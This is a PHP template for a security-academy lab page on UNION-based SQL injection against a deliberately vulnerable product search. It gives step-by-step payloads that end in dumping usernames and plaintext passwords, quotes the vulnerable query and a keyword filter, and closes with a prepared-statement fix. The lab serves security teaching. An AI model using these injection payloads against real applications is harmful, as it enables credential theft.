<?php
require __DIR__ . '/_layout.php';

$lessons = require_once __DIR__ . '/lessons.php';
$lesson  = $lessons['sqli-union'];

academy_layout_start($lesson['title']);
?>

<header class="academy-lesson-head">
    <div class="academy-lesson-eyebrow"><?= htmlspecialchars($lesson['category']) ?> &middot; Lab 02</div>
    <h1><?= htmlspecialchars($lesson['title']) ?></h1>
    <div class="academy-lesson-meta">
        <span class="academy-badge is-medium"><?= htmlspecialchars($lesson['difficulty']) ?></span>
        <span class="academy-badge is-ready">Ready</span>
    </div>
</header>

<?php academy_render_related_labs('sqli-union'); ?>

<!-- 1. THEORY -->
<section class="academy-block">
    <h2>1. Theory</h2>
    <p>
        Where login-bypass SQLi just needs the query to return any row, a <strong>UNION-based
        injection</strong> lets us reuse the application&apos;s own response rendering to leak
        the contents of arbitrary tables. The trick is to append a second <code>SELECT</code>
        to the original one with the <code>UNION</code> operator, so the result set the
        application happily renders also contains rows we picked.
    </p>
    <p>For UNION to work, three things have to line up:</p>
    <ol>
        <li>The injection point must let us terminate the original predicate cleanly.</li>
        <li>Our injected <code>SELECT</code> must return the <em>same number of columns</em>
            as the original.</li>
        <li>The data we want to leak has to be placed in a column that the application
            actually renders to HTML.</li>
    </ol>
</section>

<!-- 2. TASK 1 - LOCATE THE SINK AND CONFIRM SQLi -->
<section class="academy-block">
    <h2>2. Task 1 - locate the sink and confirm SQLi</h2>
    <p>
        Find a user-controlled parameter that is concatenated directly into a SQL query
        <em>and</em> whose result rows are rendered back into the HTML. UNION needs both:
        a way to terminate the original predicate, and a place in the response where the
        columns you inject will actually surface.
    </p>
    <p>
        Once you have a candidate, prove the input is reaching the SQL parser by sending
        a single stray quote. If the page reacts differently from a benign query - ideally
        with a verbose error - you have your injection point.
    </p>
    <details class="academy-hint">
        <summary>Reveal the injection point</summary>
        <p>
            The product search on <code>products.php</code> is the perfect candidate. The
            search term is taken straight from the query string and concatenated into a
            <code>LIKE</code> clause:
        </p>
        <pre><code>$q = $_GET["q"] ?? "";

$sql = "SELECT id, name, price, category, image
        FROM products
        WHERE name LIKE '%$q%'";

$res = $db-&gt;query($sql);
$rows = $res-&gt;fetchAll(PDO::FETCH_ASSOC);</code></pre>
        <p>
            On any SQL error the page even prints the failing query and the PDO message
            back to the browser - a huge help while you iterate on payloads. The result rows
            are rendered as product cards, which is exactly the kind of visible sink UNION
            needs. A probe like <code>?q=%'</code> closes the <code>LIKE</code> string
            mid-pattern and immediately trips the &quot;SQL Error&quot; box.
        </p>
    </details>
</section>

<!-- 3. TASK 2 - MAP THE QUERY: COLUMN COUNT AND VISIBLE SLOTS -->
<section class="academy-block">
    <h2>3. Task 2 - map the query: column count and visible slots</h2>
    <p>
        Before you can <code>UNION</code> anything in, the second <code>SELECT</code> has
        to match the original column count <em>exactly</em>, and you need to know which
        of those columns the application actually renders into the HTML. Two sub-steps:
    </p>
    <ol>
        <li>
            <strong>Count the columns.</strong> The classic trick is <code>ORDER BY n</code>
            with increasing <code>n</code> until the database complains that the column
            index is out of range. The last index that worked is the column count.
        </li>
        <li>
            <strong>Find the visible columns.</strong> Inject unique string markers like
            <code>'COL_1','COL_2',...</code> in a <code>UNION SELECT</code> and see which
            ones appear in the rendered page. Use a junk search term (e.g.
            <code>ZZZ%'</code>) so the original <code>WHERE</code> matches nothing and only
            your injected rows render.
        </li>
    </ol>
    <details class="academy-hint">
        <summary>Reveal the column count and visible slots</summary>
        <p>
            <code>ORDER BY 5 --&nbsp;</code> works, <code>ORDER BY 6 --&nbsp;</code>
            errors - so there are <strong>5 columns</strong>:
            <code>id, name, price, category, image</code>. Of those, the marker test
            shows that columns <strong>2</strong> (name, rendered as the product title)
            and <strong>3</strong> (price, rendered next to the title) are the ones you
            actually see on screen. Those are your two exfiltration slots.
        </p>
    </details>
</section>

<!-- 4. TASK 3 - DUMP THE USERS TABLE -->
<section class="academy-block">
    <h2>4. Task 3 - dump the users table</h2>
    <ol>
        <li>List the tables in the database via
            <code>SELECT name FROM sqlite_master WHERE type='table'</code>, wrapped in a
            <code>UNION SELECT</code> that respects your column layout from Task 2. Tip:
            wrap the names in sentinels like <code>printf('!!!%s!!!', name)</code> so you
            can scrape them out of the HTML with a regex.</li>
        <li>Pick the <code>users</code> table and place <code>username</code> and
            <code>password</code> into the two visible column slots you found.</li>
        <li>
            <strong>Goal:</strong> render every row from <code>users</code> as a fake
            product card whose name is the username and whose price is the plaintext
            password.
        </li>
    </ol>
    <p>
        You will need a valid <code>PHPSESSID</code> cookie because <code>products.php</code>
        redirects unauthenticated visitors. Register any account, or chain this lab on top
        of the login-bypass lab.
    </p>
</section>

<!-- 5. START THE LAB -->
<section class="academy-block">
    <h2>5. Start the lab</h2>
    <p>The vulnerable search page opens in a new tab. Log in first as
        <code>carlos</code> / <code>1234</code> if you are not already, then try
        simple payloads in the URL bar (<code>?q=...</code>) or in the header
        search box.</p>
    <a class="academy-lab-cta"
       href="<?= htmlspecialchars($lesson['target_url']) ?>"
       target="_blank" rel="noopener">Open vulnerable product search</a>
</section>

<!-- 6. REVEAL SOLUTION -->
<details class="academy-solution" id="academy-solution">
    <summary>Reveal solution (spoilers!)</summary>
    <div class="academy-solution-body">
        <p class="academy-solution-warning">
            Try the lab on your own first. Reading the solution before attempting it
            yourself defeats the point of the exercise.
        </p>

        <h3>Step 1 - sanity check that injection works</h3>
        <p>Send a stray single quote, which corrupts the query syntax:</p>
        <pre><code>GET /CyberProject/products.php?q=%'</code></pre>
        <p>
            The page replies with the red <strong>SQL Error</strong> box echoing the
            broken query. That tells you the parameter is unescaped <em>and</em> that errors
            are visible - perfect for in-band UNION.
        </p>

        <h3>Step 2 - count the columns with <code>ORDER BY</code></h3>
        <p>
            Increment the column index until the database complains:
        </p>
        <pre><code>?q=%' ORDER BY 1 --     OK
?q=%' ORDER BY 2 --     OK
?q=%' ORDER BY 3 --     OK
?q=%' ORDER BY 4 --     OK
?q=%' ORDER BY 5 --     OK
?q=%' ORDER BY 6 --     SQL Error  -&gt; there are 5 columns</code></pre>

        <h3>Step 3 - figure out which columns are rendered</h3>
        <p>Inject string markers and see which ones appear in the HTML:</p>
        <pre><code>?q=ZZZ%' UNION SELECT 'COL_1','COL_2','COL_3','COL_4','COL_5' --</code></pre>
        <p>
            The <code>ZZZ</code> in the original predicate guarantees the legitimate
            <code>WHERE</code> matches nothing, so only our injected rows render. The
            product cards now show <code>COL_2</code> as the name and <code>COL_3</code> as
            the price - these are our exfiltration slots.
        </p>

        <h3>Step 4 - enumerate tables from <code>sqlite_master</code></h3>
        <pre><code>?q=ZZZ%' UNION SELECT rowid, printf('!!!%s!!!', name), NULL, NULL, NULL
       FROM sqlite_master WHERE type='table' --</code></pre>
        <p>
            Wrapping the names in <code>!!!...!!!</code> sentinels makes them easy to scrape
            out of the HTML with a regex. You will see at least <code>products</code>,
            <code>users</code>, <code>reviews</code>, <code>deals</code>.
        </p>

        <h3>Step 5 - dump credentials</h3>
        <pre><code>?q=ZZZ%' UNION SELECT id, username, password, NULL, NULL FROM users --</code></pre>
        <p>
            Every user row now renders as a product card whose &quot;name&quot; is the
            username and whose &quot;price&quot; is the plaintext password. Passwords are
            stored unhashed - feel free to take a moment to be horrified.
        </p>

        <div class="academy-callout">
            <strong>Why UNION is blocked elsewhere:</strong> the coupon endpoint on
            <code>cart.php</code> calls
            <code>preg_match('/union/i', $code_input)</code> and refuses anything containing
            the keyword. That is what forces the <em>blind</em> SQLi lab to use timing
            instead of UNION.
        </div>

        <details style="margin-top: 1rem;">
            <summary style="cursor: pointer; font-weight: 600;">Bonus: automated exploit</summary>
            <p style="margin-top: 0.75rem;">
                The script below performs all five steps and parses the resulting HTML with
                BeautifulSoup, returning a list of <code>(username, password)</code> tuples. It
                expects a valid <code>PHPSESSID</code> in its <code>sid</code> variable.
            </p>
            <div class="academy-script">
                <?php highlight_file(__DIR__ . '/../scripts/SQLi_Union.py'); ?>
            </div>
        </details>

        <h3>How to fix it (for context)</h3>
        <p>
            The root cause is that the user&apos;s search term is glued straight into the
            SQL string with <code>"...LIKE '%$q%'"</code>. The fix is to switch to a
            <strong>prepared statement with a bound parameter</strong>:
        </p>
        <pre><code>$stmt = $db-&gt;prepare(
    "SELECT id, name, price, category, image
       FROM products
      WHERE name LIKE :q"
);
$stmt-&gt;execute([':q' =&gt; '%' . $q . '%']);
$rows = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);</code></pre>
        <p>What changes here:</p>
        <ul>
            <li><code>prepare()</code> sends the SQL <em>template</em> to the database
                first, with a placeholder <code>:q</code> where the value will go. The
                database parses and plans the query at this point - no user input is
                involved yet, so there is nothing to inject into.</li>
            <li><code>execute([':q' =&gt; ...])</code> sends the user value
                <em>separately</em>, as pure data. Even if <code>$q</code> is something
                like <code>' UNION SELECT password FROM users --</code>, the database
                treats the whole string as a literal pattern to match with
                <code>LIKE</code>. The injected SQL is never parsed as SQL.</li>
        </ul>
        <p>Two more things you should fix while you are in there:</p>
        <ul>
            <li><strong>Stop printing PDO error messages to the browser.</strong> The
                current page shows the failing query and the SQLite error in a red box,
                which hands an attacker the exact query shape on the very first probe. In
                production, log the error server-side and show the user a generic
                &quot;Something went wrong.&quot;</li>
            <li><strong>Hash the passwords.</strong> Even after the UNION is closed, the
                <code>users</code> table still stores passwords in plaintext - so any
                future read-access bug (a different SQLi, a backup leak, an insider)
                hands over every account. Store
                <code>password_hash($pw, PASSWORD_DEFAULT)</code> and verify with
                <code>password_verify()</code>; never store the password itself.</li>
        </ul>
    </div>
</details>

<script>
(function () {
    var details = document.getElementById('academy-solution');
    if (!details) return;
    details.addEventListener('toggle', function () {
        if (this.open && !this.dataset.confirmed) {
            var ok = confirm('Are you sure you want to see the solution?\n\nTry the lab first - that is where the learning happens.');
            if (!ok) { this.open = false; } else { this.dataset.confirmed = '1'; }
        }
    });
})();
</script>

<p style="margin-top: 28px;">
    <a href="index.php">&larr; Back to all labs</a>
</p>

<?php
academy_layout_end();
